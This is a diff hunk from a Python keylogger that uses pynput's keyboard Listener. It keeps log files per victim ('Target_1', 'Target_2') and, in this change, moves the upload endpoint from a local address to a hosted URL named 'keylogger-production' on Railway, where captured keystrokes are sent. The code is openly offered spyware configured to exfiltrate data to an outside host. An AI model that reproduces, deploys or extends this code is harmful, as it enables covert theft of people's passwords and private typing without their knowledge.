@@ -7,7 +7,7 @@ from pynput.keyboard import Key, Listener
 TARGET_DIR = "Logs"  # Directory to store logs
 USER_NAME = "Target_1"  # Change this dynamically based on the user/device (e.g., "Target_1", "Target_2", etc.)
 LOG_FILE = os.path.join(TARGET_DIR, f"{USER_NAME}.txt")  # Dynamic file name for each target
-API_URL = "http://0.0.0.0:5000/logs"  # Replace with your FastAPI server URL
+API_URL = "https://keylogger-production-3a51.up.railway.app/logs"  # Replace with your FastAPI server URL
 MAX_SIZE = 10 * 1024 * 1024  # 10MB file size limit
 
 # Ensure the Logs directory exists
